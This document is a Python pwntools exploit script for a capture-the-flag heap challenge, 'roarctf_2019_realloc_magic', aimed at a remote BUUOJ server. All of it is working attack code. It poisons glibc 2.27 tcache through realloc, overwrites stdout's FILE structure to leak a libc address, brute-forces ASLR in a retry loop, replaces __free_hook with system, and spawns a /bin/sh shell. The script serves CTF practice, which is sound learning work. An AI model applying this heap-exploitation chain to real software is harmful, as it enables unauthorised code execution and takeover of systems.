from pwn import *
context.log_level = 'debug'

elf = ELF("./roarctf_2019_realloc_magic")
#p = elf.process()
libc = ELF("./libc-2.27.so")

def dbg():
	gdb.attach(p)
	p.interactive()
def re(size, content):
	p.sendlineafter(">> ", '1')
	p.sendlineafter("Size?", str(size))
	p.sendafter("Content?", content)

def fr():
	p.sendlineafter(">> ", '2')

def ba():
	p.sendlineafter(">> ", '666')

def exp():
	global p
	p = remote("node3.buuoj.cn", 28467)
	re(0x80, 'a')
	re(0, '')	
	re(0x90, 'b')
	re(0, '')
	re(0x20, 'b')
	re(0, '')
	re(0x90, 'a')
	for i in range(7):
		fr()
	re(0, '')
	re(0x80, 'a')	
	re(0x110, '\x00'*0x88 + p64(0x51)+'\x60\xf7')	
	re(0, '')
	re(0x90, 'a')	
	re(0, '')
	try:	
		re(0x90, p64(0xfbad1800)+p64(0)*3+'\x00')
	except:
		log.failure("not lucky enough!")
		p.close()
		return False	
	libc_base = u64(p.recvuntil("\x7f", timeout=0.5)[-6:].ljust(8,'\x00'))-0x3ed8b0
	if libc_base&0xFF!=0x00:
		log.failure("not lucky enough!")
        	p.close()
        	return False
	log.success('libc_base ==> ' + hex(libc_base))	
	ba()
	re(0x120, '\x00'*0x88+p64(0x61)+p64(libc_base+libc.sym['__free_hook']))
	re(0, '')	
	re(0x40, 'a')
	re(0, '')
	re(0x40, p64(libc_base+libc.sym['system']))
	re(0, '')	
	re(0x20, '/bin/sh\x00')
	fr()
	p.interactive()
while not exp():
	pass
if __name__ == '__main__':
	exp()